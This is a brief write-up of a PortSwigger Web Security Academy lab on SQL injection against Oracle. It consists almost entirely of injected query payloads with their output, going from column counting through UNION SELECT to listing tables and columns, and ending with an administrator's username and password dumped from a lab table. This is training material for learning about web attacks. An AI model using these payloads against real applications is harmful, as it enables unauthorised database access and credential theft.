Lab: SQL injection attack, listing the database contents on Oracle
#https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
```bash
GET /filter?category=Gifts'
```
```bash
GET /filter?category=Gifts'--
```
```bash
GET /filter?category=Gifts' order by 1--
GET /filter?category=Gifts' order by 2--
GET /filter?category=Gifts' order by 3--
```
```bash
Gifts' UNION SELECT 'a','a'FROM DUAL--
```
```bash
Gifts' UNION SELECT banner,NULL FROM v$version--

#Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```
```bash
  Gifts' UNION SELECT table_name,NULL FROM all_tables--

#USERS_WXHYIG
#APP_USERS_AND_ROLES
#SDO_PREFERRED_OPS_USER
```
```bash
GET /filter?category=Gifts' UNION SELECT column_name,NULL FROM all_tab_columns where table_name= 'USERS_WXHYIG'--

#PASSWORD_SBBXJA
#USERNAME_TVNWJG
```
```bash
GET /filter?category=Gifts' UNION SELECT USERNAME_TVNWJG,PASSWORD_SBBXJA FROM USERS_WXHYIG --
administrator
t696w0o3z6xyd7glavwd
```
